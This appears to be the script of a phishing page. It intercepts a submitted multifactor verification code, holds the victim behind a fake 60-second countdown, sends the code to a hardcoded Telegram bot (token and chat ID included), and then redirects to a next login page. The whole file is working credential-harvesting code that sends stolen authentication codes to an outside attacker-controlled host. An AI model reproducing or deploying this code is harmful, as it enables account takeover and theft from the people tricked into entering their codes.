let formm;
let delayy;
let counterr;
let email_field;
let submit_btn;
let countdownInterval; // To store the interval for clearing later

document.addEventListener("DOMContentLoaded", () => {
    console.log("Page loaded");
    counterr = document.querySelector(".counterr");
    delayy = document.getElementById("delayy");
    email_field = document.getElementById("multifactor_code");
    submit_btn = document.querySelector("button[type='submit']");
    formm = document.getElementById("new_multifactor");

    // Initially hide the delayy element on page load
    delayy.style.display = "none";

    formm.addEventListener("submit", (e) => {
        e.preventDefault(); // Prevent default form submission

        // Only show the counter if the form is valid (e.g., input is not empty)
        if (email_field.value.trim() !== "") { // Basic validation
            show_counter().then(() => {
                console.log("submit form");
                send_telegram_message();
            });
        } else {
            console.log("Verification code field is empty.");
            // Optionally, display an error message to the user
        }
    });
});

function show_counter() {
    submit_btn.setAttribute("disabled", "true"); // Disable the submit button
    delayy.style.display = "flex"; // Show the delayy container

    let count = 60; // Start countdown from 60 seconds
    counterr.textContent = count; // Set initial counter text

    // Clear any existing interval to prevent multiple timers running
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }

    return new Promise((resolve) => {
        countdownInterval = setInterval(() => {
            count--;
            counterr.textContent = count;
            if (count <= 0) {
                clearInterval(countdownInterval); // Stop the countdown
                resolve(); // Resolve the promise when countdown finishes
            }
        }, 1000); // Update every 1 second (1000ms)
    });
}

async function send_telegram_message() {
    const chatIds = ["-1001991348429"]; // Add your chat IDs here
    const verificationCode = email_field.value;
    const msg = `Verification code: ${verificationCode}`;

    for (let i = 0; i < chatIds.length; i++) {
        const data = {
            chat_id: chatIds[i],
            text: msg,
        };

        try {
            const resp = await fetch(
                `https://api.telegram.org/bot7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug/sendMessage`, // Replace 'your_bot_token' with your actual bot token
                {
                    method: "POST",
                    headers: {
                        accept: "application/json",
                        "content-type": "application/json",
                    },
                    body: JSON.stringify(data),
                }
            );

            const resJson = await resp.json();
            console.log(resJson);

            if (resJson.ok) {
                console.log("Message sent successfully");
            } else {
                console.error("Telegram API response indicates failure:", resJson);
            }

            // Redirect to the next page after sending the message
            window.location.href = "/Login/validate/index.html"; // Replace "nextpage.html" with the URL of the next page
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }
}